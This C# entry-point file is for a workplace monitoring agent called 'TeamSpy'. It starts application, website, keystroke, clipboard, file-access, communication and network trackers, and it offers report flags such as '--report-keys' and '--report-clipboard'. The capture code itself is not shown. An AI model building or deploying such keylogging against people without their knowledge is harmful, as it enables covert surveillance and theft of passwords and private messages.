using Microsoft.Win32;

namespace TeamSpy.Agent
{
    class Program
    {
        private static DatabaseManager? _dbManager;

        static void Main(string[] args)
        {
            _dbManager = new DatabaseManager("monitoring.db");

            if (args.Length > 0)
            {
                HandleReportGeneration(args);
                return;
            }

            Console.WriteLine("Starting TeamSpy Agent for monitoring...");

            var appTracker = new ApplicationTracker(_dbManager);
            var webMonitor = new WebsiteMonitor(_dbManager);
            var keyLogger = new KeyLogger(_dbManager);
            var clipboardMonitor = new ClipboardMonitor(_dbManager);
            var fileAccessMonitor = new FileAccessMonitor(_dbManager);
            var communicationMonitor = new CommunicationMonitor(_dbManager);
            var networkMonitor = new NetworkMonitor(_dbManager);

            // Start Session Monitoring
            SystemEvents.SessionSwitch += new SessionSwitchEventHandler(SystemEvents_SessionSwitch);

            appTracker.Start();
            webMonitor.Start();
            keyLogger.Start();
            clipboardMonitor.Start();
            fileAccessMonitor.Start();
            communicationMonitor.Start();
            networkMonitor.Start();

            Console.WriteLine("Agent is running. Press Enter to exit.");
            Console.ReadLine(); // Keep the agent running

            // Stop services gracefully
            networkMonitor.Stop();
            communicationMonitor.Stop();
            fileAccessMonitor.Stop();
            clipboardMonitor.Stop();
            keyLogger.Stop();
            webMonitor.Stop();
            appTracker.Stop();
            SystemEvents.SessionSwitch -= new SessionSwitchEventHandler(SystemEvents_SessionSwitch);
            Console.WriteLine("TeamSpy Agent stopped.");
        }

        static void SystemEvents_SessionSwitch(object sender, SessionSwitchEventArgs e)
        {
            if (_dbManager != null)
            {
                _dbManager.LogSessionEvent(DateTime.Now, e.Reason.ToString());
            }
        }

        private static void HandleReportGeneration(string[] args)
        {
            if (_dbManager == null) return;

            switch (args[0].ToLower())
            {
                case "--report-web":
                    _dbManager.GenerateWebUsageReport();
                    break;
                case "--report-app":
                    _dbManager.GenerateAppUsageReport();
                    break;
                case "--report-session":
                    _dbManager.GenerateSessionReport();
                    break;
                case "--report-keys":
                    _dbManager.GenerateKeyReport();
                    break;
                case "--report-clipboard":
                    _dbManager.GenerateClipboardReport();
                    break;
                case "--report-file-access":
                    _dbManager.GenerateFileAccessReport();
                    break;
                case "--report-communication":
                    _dbManager.GenerateCommunicationReport();
                    break;
                case "--report-network":
                    _dbManager.GenerateNetworkReport();
                    break;
                default:
                    Console.WriteLine("Invalid report type specified.");
                    break;
            }
        }
    }
}
